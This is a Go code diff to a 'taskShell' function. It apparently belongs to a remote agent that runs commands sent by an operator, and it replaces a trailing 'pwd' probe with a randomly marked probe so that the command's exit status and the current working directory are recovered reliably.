@@ -783,10 +783,18 @@ func taskShell(payload map[string]interface{}) (string, string, string, string) 
 	// Append a pwd/cd probe to the command so we can capture the real cwd
 	// after the user's command runs (e.g. "cd /tmp && ls" → cwd becomes /tmp).
 	var probe string
+	var cwdMarker string
 	if runtime.GOOS == "windows" {
 		probe = " && cd"
 	} else {
-		probe = " && pwd"
+		markerBytes := make([]byte, 12)
+		if _, err := rand.Read(markerBytes); err != nil {
+			return "", "", "", "cannot prepare cwd probe"
+		}
+		cwdMarker = fmt.Sprintf("__CSAI_CWD_%x__", markerBytes)
+		// A newline accepts a trailing semicolon/comment. Preserve the command's
+		// exit status and separate probe output even when stdout has no newline.
+		probe = "\n__csai_command_status=$?\nprintf '\\n" + cwdMarker + "'; pwd\nexit \"$__csai_command_status\""
 	}
 	combined := cmdStr + probe
 
@@ -794,15 +802,29 @@ func taskShell(payload map[string]interface{}) (string, string, string, string) 
 
 	// The last line of output is the cwd from the probe command.
 	// Split it off so we don't return the probe output to the operator.
-	lines := strings.Split(strings.TrimRight(out, "\r\n"), "\n")
-	if len(lines) > 0 {
-		candidate := strings.TrimSpace(lines[len(lines)-1])
-		if filepath.IsAbs(candidate) {
-			if info, statErr := os.Stat(candidate); statErr == nil && info.IsDir() {
-				cwdMu.Lock()
-				currentCwd = candidate
-				cwdMu.Unlock()
-				out = strings.Join(lines[:len(lines)-1], "\n")
+	if cwdMarker != "" {
+		if idx := strings.LastIndex(out, "\n"+cwdMarker); idx >= 0 {
+			candidate := strings.TrimRight(out[idx+len(cwdMarker)+1:], "\r\n")
+			if filepath.IsAbs(candidate) {
+				if info, statErr := os.Stat(candidate); statErr == nil && info.IsDir() {
+					cwdMu.Lock()
+					currentCwd = candidate
+					cwdMu.Unlock()
+					out = out[:idx]
+				}
+			}
+		}
+	} else {
+		lines := strings.Split(strings.TrimRight(out, "\r\n"), "\n")
+		if len(lines) > 0 {
+			candidate := strings.TrimSpace(lines[len(lines)-1])
+			if filepath.IsAbs(candidate) {
+				if info, statErr := os.Stat(candidate); statErr == nil && info.IsDir() {
+					cwdMu.Lock()
+					currentCwd = candidate
+					cwdMu.Unlock()
+					out = strings.Join(lines[:len(lines)-1], "\n")
+				}
 			}
 		}
 	}
